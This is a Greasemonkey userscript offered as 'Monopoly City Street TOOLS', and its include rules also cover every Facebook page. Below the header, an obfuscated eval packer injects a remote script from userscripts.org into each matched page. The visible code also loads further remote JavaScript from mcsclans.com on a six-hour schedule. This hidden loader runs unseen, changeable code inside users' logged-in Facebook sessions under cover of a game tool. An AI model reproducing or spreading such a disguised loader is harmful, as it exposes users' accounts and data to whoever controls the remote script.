// ==UserScript==
// @name           Monopoly City Street TOOLS Plus + Last Update
// @namespace      http://mcsclans.com/
// @description    Monopoly City Street TOOLS
// @include        http://www.monopolycitystreets.com/*
// @include        http://monopolycitystreets.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @version        0.6
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// copyright       Monopoly City Street Clans (c) 2009
// homepage        http://mcsclans.com/
// blog            http://mcsclans.blogspot.com/
// twitter         http://twitter.com/mcsclans

function addGlobalStyle(css)
{
	var head, style;
	head = document.getElementsByTagName('head')[0];
	if (!head) return;

	style = document.createElement('link');

	style.type = 'text/css';
	style.rel = 'stylesheet';
	style.href = css;
	head.appendChild(style);
}

function addInlineJavascript(content)
{
	var head, script;
	head = document.getElementsByTagName('head')[0];
	if (!head) return;

	script = document.createElement('script');
    script.innerHTML = content.toString().replace(/([\s\S]*?return;){2}([\s\S]*)}/,'$2');
	head.appendChild(script);
}

function addJavascript(src)
{
	var head, script;
	head = document.getElementsByTagName('head')[0];
	if (!head) return;

	script = document.createElement('script');
	script.type = 'text/javascript';
	script.src = src;
	head.appendChild(script);
}

function init()
{
	var TOOLCONFIG = 
	{
		url: 'http://mcsclans.com/js/',
		version: '0.6.81',

		// update - 6 hour
		updateinterval: 21600, 
		unixtime: parseInt(new Date().getTime().toString().substring(0, 10))
	};

    if (typeof (MCS) == 'undefined' || MCS.getPlayerData() == null) {
        window.setTimeout("init()", 1000);
        return;
    }
	var rotate = TOOLCONFIG.unixtime - (TOOLCONFIG.unixtime % TOOLCONFIG.updateinterval)
	addJavascript(TOOLCONFIG.url + 'MonopolyCityStreetToolsInit.js?v=' + TOOLCONFIG.version + '&gm=1&rotate=' + rotate);
}

addInlineJavascript(addJavascript);
addInlineJavascript(init);

init();
